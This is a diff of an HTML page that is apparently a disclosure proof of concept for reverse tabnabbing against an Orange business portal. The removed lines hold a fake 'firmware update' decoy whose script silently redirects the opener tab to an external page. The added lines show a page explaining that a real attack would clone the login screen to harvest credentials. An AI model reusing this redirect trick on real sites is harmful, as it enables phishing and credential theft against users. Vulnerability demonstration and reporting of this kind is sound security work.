@@ -2,44 +2,39 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Authenticating Update...</title>
+    <title>PoC: Reverse Tabnabbing</title>
     <style>
-        body { text-align: center; font-family: sans-serif; background-color: #f8f9fa; padding-top: 15vh; color: #333; }
-        .spinner { border: 6px solid #f3f3f3; border-top: 6px solid #ff7900; border-radius: 50%; width: 70px; height: 70px; animation: spin 1s linear infinite; margin: 0 auto 30px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .success-icon { display: none; font-size: 60px; color: #28a745; margin-bottom: 20px; }
+        body {
+            background-color: #1a1a1a;
+            color: #fff;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            border: 2px solid #ff4444;
+            padding: 40px;
+            background-color: #2a2a2a;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 68, 68, 0.5);
+            max-width: 600px;
+        }
+        h1 { color: #ff4444; }
+        p { font-size: 1.2em; line-height: 1.6; }
+        .highlight { color: #ffeb3b; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div id="loading-view">
-        <div class="spinner"></div>
-        <h2>Processing Firmware Update...</h2>
-        <p>Please wait while we establish a secure connection.<br>Do not close this window.</p>
+    <div class="container">
+        <h1>🚨 Proof of Concept 🚨</h1>
+        <h2>Phishing Successful</h2>
+        <p>This tab was originally <span class="highlight">liveobjects.orange-business.com</span>.</p>
+        <p>Due to UI Redressing vulnerability, an attacker was able to redirect this trusted tab to an external domain.</p>
+        <p>In a real-world attack, this page would be a perfect clone of the Orange Login screen designed to harvest administrator credentials.</p>
     </div>
-
-    <div id="success-view" style="display: none;">
-        <div class="success-icon">✓</div>
-        <h2>Connection Established</h2>
-        <p style="color: #d9534f; font-weight: bold;">Please return to the original tab to continue.</p>
-    </div>
-
-    <script>
-        // رابط صفحة الإثبات اللي هترفعها في الخطوة الجاية
-        const pocDemonstrationPage = "https://hussein-e4.github.io/poc-demonstration.html"; 
-
-        setTimeout(() => {
-            if (window.opener) {
-                try {
-                    // هنا بنضرب التابة الأصلية
-                    window.opener.location = pocDemonstrationPage;
-                } catch (e) {
-                    console.log("Tabnabbing failed.");
-                }
-            }
-            document.getElementById('loading-view').style.display = 'none';
-            document.getElementById('success-view').style.display = 'block';
-            document.querySelector('.success-icon').style.display = 'block';
-        }, 2000);
-    </script>
 </body>
 </html>
